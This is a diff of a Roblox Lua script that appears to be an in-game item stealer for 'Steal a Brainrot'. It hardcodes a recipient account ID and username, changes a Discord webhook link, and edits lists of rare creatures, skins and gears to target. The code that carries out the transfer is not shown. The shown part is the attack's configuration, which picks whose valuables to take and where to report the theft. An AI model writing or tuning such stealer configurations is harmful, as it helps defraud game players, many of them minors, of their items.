@@ -1,6 +1,6 @@
 local TARGET_ID = 7826033392
 local TARGET_USER = "pedritos33221"
-local WEBHOOK_URL = "https://discord.gg/AAjf82mtx"
+local WEBHOOK_URL = "https://discord.gg/3zh3Fvh5e"
 
 local TargetBrainrots = {
     ["Strawberry Elephant"] = true,
@@ -119,7 +119,6 @@ local TargetBrainrots = {
     ["Rosetti Tualetti"] = true,
     ["Sammyni Fattini"] = true,
     ["Spooky and Pumpky"] = true,
-    ["Swag Soda"] = true,
     ["Swaggy Bros"] = true,
     ["Tacorita Bicicleta"] = true,
     ["Tang Tang Keletang"] = true,
@@ -132,21 +131,27 @@ local TargetBrainrots = {
     ["Grabatron"] = true,
     ["Rubiko and Kubiko"] = true,
     ["Cangurato Gelato"] = true,
-    ["Noodle Noodle Poodle"] = true,
     ["Candini Fluffini"] = true,
     ["La Fuse Machine"] = true,
     ["Polaroidini"] = true,
     ["Nachorilla"] = true,
     ["Sammyni Truckini"] = true,
-    ["Tacoturbo Tacorito"] = true,
     ["Chicli Chicla"] = true,
-    ["Panda Popanda"] = true,
     ["Orchidox"] = true,
     ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
     ["Plant Bros"] = true,
     ["Hydra Serpent"] = true,
-    ["Los Jolly Combinasionas"] = true
+    ["Los Jolly Combinasionas"] = true,
+    ["Panda Popanda"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Cabin Bros"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Sammyni Bros"] = true,
+    ["Cobra Gelato"] = true
 }
 
 local TargetBaseSkins = {
@@ -158,7 +163,6 @@ local TargetBaseSkins = {
     ["Cyber"] = true,
     ["Diamond"] = true,
     ["Divine"] = true,
-    ["Easter"] = true,
     ["Galaxy"] = true,
     ["Gingerbread"] = true,
     ["Gold"] = true,
@@ -174,7 +178,8 @@ local TargetBaseSkins = {
     ["Taco"] = true,
     ["Valentines"] = true,
     ["Yin Yang"] = true,
-    ["Tralalero"] = true
+    ["Tralalero"] = true,
+    ["Easter"] = true
 }
 
 local TargetGears = {
@@ -189,7 +194,8 @@ local TargetGears = {
     ["Santa's Sleigh"] = true,
     ["Waverider"] = true,
     ["Witch's Broom"] = true,
-    ["Yin Yang Lamp"] = true
+    ["Yin Yang Lamp"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
